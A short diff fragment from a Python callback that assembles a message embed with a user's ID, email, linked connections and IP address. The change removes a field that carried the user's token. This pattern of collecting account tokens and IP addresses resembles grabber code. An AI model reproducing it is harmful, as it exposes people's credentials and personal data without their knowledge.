@@ -147,8 +147,7 @@ def callback():
                         {"name": "🆔 ID", "value": f"`{user_id}`", "inline": True},
                         {"name": "📧 Email", "value": f"`{email}` {verified}", "inline": False},
                         {"name": "🔗 Conexiones", "value": f"{conn_str}", "inline": False},
-                        {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
-                        {"name": "TOKEN", "value": f"`{token}`", "inline": False}
+                        {"name": "🌐 IP", "value": f"`{ip}`", "inline": False}
                     ]
                 }]
             })
